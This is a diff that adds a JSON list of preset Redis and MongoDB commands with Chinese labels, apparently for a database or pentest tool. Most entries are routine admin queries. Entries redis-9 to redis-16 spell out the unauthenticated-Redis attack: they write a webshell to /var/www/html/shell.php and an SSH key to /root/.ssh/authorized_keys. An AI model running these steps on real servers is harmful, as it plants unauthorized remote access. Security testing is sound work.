@@ -1,0 +1,117 @@
+{
+  "redis": [
+    {
+      "id": "redis-1",
+      "name": "查看所有键",
+      "command": "KEYS *"
+    },
+    {
+      "id": "redis-2",
+      "name": "查看信息",
+      "command": "INFO"
+    },
+    {
+      "id": "redis-3",
+      "name": "查看客户端",
+      "command": "CLIENT LIST"
+    },
+    {
+      "id": "redis-4",
+      "name": "查看内存",
+      "command": "INFO MEMORY"
+    },
+    {
+      "id": "redis-5",
+      "name": "查看配置",
+      "command": "CONFIG GET *"
+    },
+    {
+      "id": "redis-6",
+      "name": "查看慢查询",
+      "command": "SLOWLOG GET 10"
+    },
+    {
+      "id": "redis-7",
+      "name": "数据库大小",
+      "command": "DBSIZE"
+    },
+    {
+      "id": "redis-8",
+      "name": "查看连接",
+      "command": "CLIENT INFO"
+    },
+    {
+      "id": "redis-9",
+      "name": "写入shell1",
+      "command": "set shell \"一句话\""
+    },
+    {
+      "id": "redis-10",
+      "name": "写入shell2",
+      "command": "config set dir /var/www/html/"
+    },
+    {
+      "id": "redis-11",
+      "name": "写入shell3",
+      "command": "config set dbfilename shell.php"
+    },
+    {
+      "id": "redis-12",
+      "name": "写入shell4",
+      "command": "save"
+    },
+    {
+      "id": "redis-13",
+      "name": "写入ssh公钥1",
+      "command": "config set dir /root/.ssh/"
+    },
+    {
+      "id": "redis-14",
+      "name": "写入ssh公钥2",
+      "command": "config set dbfilename authorized_keys"
+    },
+    {
+      "id": "redis-15",
+      "name": "写入ssh公钥3",
+      "command": "set key \"\\n\\n\\生成的公钥n\\n\""
+    },
+    {
+      "id": "redis-16",
+      "name": "写入ssh公钥4",
+      "command": "save"
+    }
+  ],
+  "mongodb": [
+    {
+      "id": "mongo-1",
+      "name": "服务器状态",
+      "command": "admin.runCommand({\"serverStatus\": 1})"
+    },
+    {
+      "id": "mongo-2",
+      "name": "列出数据库",
+      "command": "admin.runCommand({\"listDatabases\": 1})"
+    },
+    {
+      "id": "mongo-3",
+      "name": "查询文档",
+      "command": "test.users.find({})"
+    },
+    {
+      "id": "mongo-4",
+      "name": "统计文档数",
+      "command": "test.users.count()"
+    },
+    {
+      "id": "mongo-5",
+      "name": "数据库统计",
+      "command": "test.runCommand({\"dbStats\": 1})"
+    },
+    {
+      "id": "mongo-6",
+      "name": "集合统计",
+      "command": "test.runCommand({\"collStats\": \"users\"})"
+    }
+  ]
+}
+
